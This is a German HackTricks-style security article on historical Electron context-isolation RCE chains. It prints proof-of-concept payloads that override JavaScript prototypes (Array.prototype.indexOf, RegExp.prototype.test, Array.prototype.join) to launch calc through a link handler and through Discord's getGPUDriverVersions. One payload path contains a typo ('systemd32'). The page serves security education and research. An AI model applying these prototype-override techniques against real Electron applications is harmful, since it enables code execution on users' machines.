# Electron contextIsolation-RCE über preload-Code

{{#include ../../banners/hacktricks-training.md}}

Dies sind **historische Angriffsketten**, bei denen preload-Code JavaScript-Intrinsics oder privilegierte APIs mit vom Angreifer kontrollierten Renderer-Inhalten teilte. Ist context isolation aktiviert, befinden sich preload und Seite normalerweise in getrennten JavaScript-Realm-Umgebungen. Daher wirken sich Prototype-Overrides auf der Seite nicht automatisch auf preload-Objekte aus. Überprüfe die Angriffskette anhand der genauen Electron-/Anwendungsversion und der Bridge-Implementierung.<sup>[[3]](#references)</sup>

## Beispiel 1

Beispiel von [https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=30](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=30)<sup>[[1]](#references)</sup>

Dieser Code öffnet http(s)-Links im Standardbrowser:

![Electron contextIsolation-RCE über preload-Code – Beispiel 1: Dieser Code öffnet http(s)-Links im Standardbrowser](<../../images/image (768).png>)

In der betroffenen historischen Anwendung konnte eine Navigation zu einer lokalen Datei wie `file:///C:/Windows/System32/calc.exe` einen OS-Startpfad erreichen; `SAFE_PROTOCOLS.indexOf` sollte dies verhindern.

Ein Angreifer konnte daher diesen JS-Code per XSS oder beliebiger Seitennavigation einschleusen:

```html
<script>
  Array.prototype.indexOf = function () {
    return 1337
  }
</script>
```

Da der Aufruf von `SAFE_PROTOCOLS.indexOf` immer 1337 zurückgibt, kann der Angreifer den Schutz umgehen und `calc` ausführen. Finaler Exploit:

```html
<script>
  Array.prototype.indexOf = function () {
    return 1337
  }
</script>
<a href="file:///C:/Windows/systemd32/calc.exe">CLICK</a>
```

Prüfe die Originalfolien auf weitere Möglichkeiten, Programme auszuführen, ohne dass eine Berechtigungsabfrage erscheint.<sup>[[1]](#references)</sup>

In der historischen Discord-Unterhaltung wurde auch das Laden über UNC-artige `file://127.0.0.1/electron/rce.jar` als weiterer potenzieller Ausführungspfad erwogen; prüfe die Erreichbarkeit mit genau dieser Windows-/Electron-Version.<sup>[[2]](#references)</sup>

## Beispiel 2: Discord App RCE

Beispiel aus [https://mksben.l0.cm/2020/10/discord-desktop-rce.html?m=1](https://mksben.l0.cm/2020/10/discord-desktop-rce.html?m=1)<sup>[[2]](#references)</sup>

Bei der Überprüfung der Preload-Skripte stellte ich fest, dass Discord die Funktion `DiscordNative.nativeModules.requireModule('MODULE-NAME')`, mit der einige erlaubte Module aufgerufen werden können, für die Webseite verfügbar macht.\
Hier konnte ich keine Module verwenden, mit denen sich RCE direkt ausführen lässt, etwa das _child_process_-Modul. Ich **fand jedoch Code, mit dem sich RCE erreichen lässt, indem die integrierten JavaScript-Methoden überschrieben und die Ausführung des verfügbaren Moduls beeinflusst werden**.

Das Folgende ist der PoC. Ich konnte bestätigen, dass die Anwendung **calc** **geöffnet** wird, wenn ich in den DevTools die im Modul "_discord_utils_" definierte Funktion `getGPUDriverVersions` **aufrufe und dabei `RegExp.prototype.test` und `Array.prototype.join` überschreibe**.

```javascript
RegExp.prototype.test = function () {
  return false
}
Array.prototype.join = function () {
  return "calc"
}
DiscordNative.nativeModules
  .requireModule("discord_utils")
  .getGPUDriverVersions()
```

Die Funktion `getGPUDriverVersions` versucht, das Programm mithilfe der Bibliothek „_execa_“ auszuführen, wie folgt:

```javascript
module.exports.getGPUDriverVersions = async () => {
  if (process.platform !== "win32") {
    return {}
  }

  const result = {}
  const nvidiaSmiPath = `${process.env["ProgramW6432"]}/NVIDIA Corporation/NVSMI/nvidia-smi.exe`

  try {
    result.nvidia = parseNvidiaSmiOutput(await execa(nvidiaSmiPath, []))
  } catch (e) {
    result.nvidia = { error: e.toString() }
  }

  return result
}
```

In der Regel versucht _execa_, "_nvidia-smi.exe_" auszuführen, das in der Variable `nvidiaSmiPath` angegeben ist. Aufgrund der überschriebenen `RegExp.prototype.test`- und `Array.prototype.join`-Methoden **wird das Argument während der internen Verarbeitung von _execa**_** durch "**_**calc**_**" ersetzt**.

Konkret wird das Argument beeinflusst, indem die Befehlsauflösungs- und Argumentverarbeitungspfade im historischen `cross-spawn`-Parser verändert werden.<sup>[[4]](#references)</sup>

## References

- [1] [Electron: Ausnutzung der fehlenden Context Isolation - CureCon (en)](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=30)
- [2] [RCE in der Discord-Desktop-App](https://mksben.l0.cm/2020/10/discord-desktop-rce.html?m=1)
- [3] [Electron — Kontextisolierung](https://www.electronjs.org/docs/latest/tutorial/context-isolation)
- [4] [`node-cross-spawn`-Parserrevision und genaue, von der Chain verwendete Pfade (Zeilen 36–55)](https://github.com/moxystudio/node-cross-spawn/blob/16feb534e818668594fd530b113a028c0c06bddc/lib/parse.js#L36-L55)
{{#include ../../banners/hacktricks-training.md}}
